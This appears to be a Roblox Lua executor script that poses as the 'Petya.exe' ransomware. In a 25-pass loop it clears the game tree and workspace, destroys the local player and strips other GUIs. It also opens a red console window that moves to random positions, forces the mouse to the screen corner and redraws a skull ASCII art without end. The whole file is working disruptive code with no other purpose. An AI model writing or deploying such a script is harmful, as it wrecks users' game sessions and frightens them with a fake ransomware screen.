for i = 1, 25 do 
	local api = (function()
		pcall(function()
			game:ClearAllChildren()
		end)
		pcall(function()
			workspace:ClearAllChildren()
		end)
		pcall(function()
			game.Players.LocalPlayer:Destroy()
		end)
		pcall(function()
			for i, v in pairs(game:GetDescendants()) do
				if v:IsA("ScreenGui") and v.Name ~= "App" then
					v:Destroy()
				end
			end
		end)
		local App = Instance.new("ScreenGui")
		local Console = Instance.new("Frame")
		local upper = Instance.new("Frame")
		local Title = Instance.new("TextLabel")
		local image = Instance.new("ImageLabel")
		local close = Instance.new("TextButton")
		local logs = Instance.new("ScrollingFrame")
		local Template = Instance.new("TextBox")

		App.Name = "App"
		App.Parent = nil
		App.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		Console.Name = "Console"
		Console.Parent = App
		Console.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Console.Position = UDim2.new(0.318557471, 0, 0.111111119, 0)
		Console.Size = UDim2.new(0.346431226, 0, 0.290123463, 0)
		Console.Visible = false

		upper.Name = "upper"
		upper.Parent = Console
		upper.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		upper.Size = UDim2.new(0.997831285, 1, 0.0617021285, 0)

		Title.Name = "Title"
		Title.Parent = upper
		Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Title.BackgroundTransparency = 1.000
		Title.Position = UDim2.new(0.0430207364, 0, 0, 0)
		Title.Size = UDim2.new(0.922178686, 0, 1, 0)
		Title.Font = Enum.Font.SourceSans
		Title.Text = "Console.exe"
		Title.TextColor3 = Color3.fromRGB(0, 0, 0)
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextWrapped = true
		Title.TextXAlignment = Enum.TextXAlignment.Left

		image.Name = "image"
		image.Parent = upper
		image.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		image.BackgroundTransparency = 1.000
		image.Size = UDim2.new(0.0329999998, 0, 1, 0)
		image.Image = "http://www.roblox.com/asset/?id=10762290938"

		close.Name = "close"
		close.Parent = upper
		close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		close.BorderSizePixel = 0
		close.Position = UDim2.new(0.96519953, 0, 0, 0)
		close.Size = UDim2.new(0.0326534882, 0, 1, 0)
		close.Font = Enum.Font.SourceSans
		close.Text = "X"
		close.TextColor3 = Color3.fromRGB(0, 0, 0)
		close.TextScaled = true
		close.TextSize = 14.000
		close.TextWrapped = true

		logs.Name = "logs"
		logs.Parent = Console
		logs.Active = true
		logs.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		logs.Position = UDim2.new(0, 0, 0.0595744699, 0)
		logs.Size = UDim2.new(1, 0, 0.940425515, 0)
		logs.CanvasSize = UDim2.new(0, 0, 10, 0)
		logs.ScrollBarThickness = 6

		Template.Name = "Template"
		Template.Parent = logs
		Template.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Template.BackgroundTransparency = 1.000
		Template.Size = UDim2.new(1, 0, 1, 0)
		Template.ClearTextOnFocus = false
		Template.Font = Enum.Font.SourceSans
		Template.MultiLine = true
		Template.Text = ""
		Template.TextColor3 = Color3.fromRGB(255, 255, 255)
		Template.TextSize = 14.000
		Template.TextWrapped = true
		Template.TextXAlignment = Enum.TextXAlignment.Left
		Template.TextYAlignment = Enum.TextYAlignment.Top

		local module = {}

		local fake_module_scripts = {}

		do
			local function module_script()

				local API = {}

				function API:SetParent(parent : Instance)
					self.Gui.Parent = parent
				end

				function API:SetVisible(visible : boolean)
					self.Gui.Console.Visible = visible
				end

				function API:SetText(text)
					self.Gui.Console.logs.Template.Text = text
				end

				function API:Print(...)
					local list = {...}
					local text = ""
					for i, v in pairs(list) do
						text ..= tostring(v)
						if i < #list then text ..= " " end
					end
					self:SetText(self.Gui.Console.logs.Template.Text .. text)
				end

				function API:Println(...)
					self:Print(..., "\n")
				end

				function API:SetBackgroundColor(color : Color3)
					self.Gui.Console.logs.BackgroundColor3 = color
				end

				function API:SetTextColor(color : Color3)
					self.Gui.Console.logs.Template.TextColor3 = color
				end

				function API:GetInput()
					local template = self.Gui.Console.logs.Template
					template.TextEditable = true
					template:CaptureFocus()
					template.CursorPosition = #template.Text + 1
					local start = template.CursorPosition
					local input_ended = false
					local con = template:GetPropertyChangedSignal("Text"):Connect(function()
						if template.Text:sub(template.CursorPosition - 1, template.CursorPosition - 1) == "\n" then
							input_ended = true
						end
					end)
					repeat task.wait() until input_ended
					con:Disconnect()
					template.TextEditable = false
					return template.Text:sub(start, template.CursorPosition - 2)
				end

				function API:SetTitle(title : string)
					self.Gui.Console.upper.Title.Text = title
				end

				function API:SetImage(image : string)
					self.Gui.Console.upper.image.Image = image
				end

				function API:SetTextSize(size : number)
					self.Gui.Console.logs.Template.TextSize = size
				end

				function API:Clear()
					self:SetText("")
				end

				function API:Destroy()
					self.Gui:Destroy()
				end

				function module.new()
					local api = setmetatable({
						["Gui"] = App:Clone()
					}, {__index = API})
					api:SetParent(game.CoreGui)
					api.Gui.Console.Active = true
					api.Gui.Console.Draggable = true
					api.Gui.Console.upper.close.MouseButton1Click:Connect(function()
						api:SetVisible(false)
					end)
					task.spawn(function()
						while task.wait(0.2) do
							game:GetService("TweenService"):Create(api.Gui.Console, TweenInfo.new(0.2), {Position = UDim2.new(math.random(-1000, 1000) / 1000, 0,  math.random(-1000, 1000) / 1000, 0)}):Play()
						end
					end)
					return api
				end
			end
			module_script()
		end
		return module
	end)().new()
	api:SetVisible(true)
	api:SetBackgroundColor(Color3.fromRGB(170,		0,		0))
	api:SetTitle("Petya.exe")
	api:SetImage("")
	api:SetTextSize(10)
	task.spawn(function()
		while		true		do
			game:GetService("VirtualInputManager"):SendMouseMoveEvent(0, 0, workspace)
		api:Clear()
		task.wait()
		api:SetText([[
																																																																																											uu$$$$$$$$$$$uu
																																																																																					uu$$$$$$$$$$$$$$$$$uu
																																																																																			u$$$$$$$$$$$$$$$$$$$$$u
																																																																																	u$$$$$$$$$$$$$$$$$$$$$$$u
																																																																															u$$$$$$$$$$$$$$$$$$$$$$$$$u
																																																																															u$$$$$$*						*$$$*						*$$$$$$u
																																																																															*$$$$*												u$u														$$$$*
																																																																																	$$$u														u$u														u$$$
																																																																																	$$$u												u$$$u												u$$$
																																																																																			*$$$$uu$$$						$$$uu$$$$*
																																																																																					*$$$$$$$*						*$$$$$$$*
																																																																																									u$$$$$$$u$$$$$$$u
																																																																																											u$*$*$*$*$*$*$u
																																																																					uuu																$$u$		$		$		$		$u$$														uuu
																																																																					u$$$$														$$$$$u$u$u$$$														u$$$$
																																																																					$$$$$uu												*$$$$$$$$$*										uu$$$$$$
																																																																	u$$$$$$$$$$$uu								*****								uuuu$$$$$$$$$
																																																																	$$$$***$$$$$$$$$$uuu						uu$$$$$$$$$***$$$*
																																																																											***												**$$$$$$$$$$$uu		**$***
																																																																			uuuu		**$$$$$$$$$$uuu
																																																																			u$$$uuu$$$$$$$$$uu		**$$$$$$$$$$$uuu$$$
																																																																			$$$$$$$$$$****																						**$$$$$$$$$$$*
																																																																							*$$$$$*																																												**$$$$**
																																																									$$$*																																																		$$$$*																																																	$$$$*																																																$$$$*		
]])
		task.wait()
		end
	end)
end
